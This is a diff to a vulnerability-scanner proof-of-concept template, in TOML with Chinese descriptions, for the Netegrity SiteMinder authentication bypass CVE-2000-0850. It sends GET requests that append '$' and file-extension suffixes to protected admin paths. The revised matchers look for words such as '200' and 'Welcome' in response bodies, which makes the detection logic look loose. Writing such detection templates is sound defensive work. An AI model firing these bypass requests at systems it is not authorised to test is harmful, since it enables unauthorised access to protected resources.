@@ -1,14 +1,10 @@
 [info]
-author = "ave"
-description = "通过在受 SiteMinder 保护的 URL 末尾追加 $/FILENAME.ext（扩展名为 .jpg/.class/.ccc）验证是否可绕过认证访问受保护资源"
+author = "AVE"
+description = "检测 Netegrity SiteMinder 4.11 之前版本是否存在认证绕过漏洞，通过向受保护的 URL 后附加 $/FILENAME.ext 尝试绕过身份验证"
 id = "POC-AVE-2000-0971"
-name = "CVE-2000-0850 Netegrity SiteMinder 认证绕过 PoC"
+name = "Netegrity SiteMinder 认证绕过漏洞 PoC"
 severity = "high"
-tags = [
-    "cve-2000-0850",
-    "siteminder",
-    "auth-bypass",
-]
+tags = ["cve-2000-0850"]
 vuln_id = [
     "CVE-2000-0850",
     "AVE-2000-0971",
@@ -19,51 +15,48 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/protected$/bypass.jpg"
+path = "/{{BaseURL}}/admin/$.ccc"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "200",
+    "Welcome",
+    "Admin",
+    "Dashboard",
+]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/protected$/bypass.class"
+path = "/{{BaseURL}}/protected/$.class"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "200",
+    "Welcome",
+    "Admin",
+    "Dashboard",
+]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/protected$/bypass.ccc"
+path = "/{{BaseURL}}/secure/$.jpg"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "200",
+    "Welcome",
+    "Admin",
+    "Dashboard",
+]
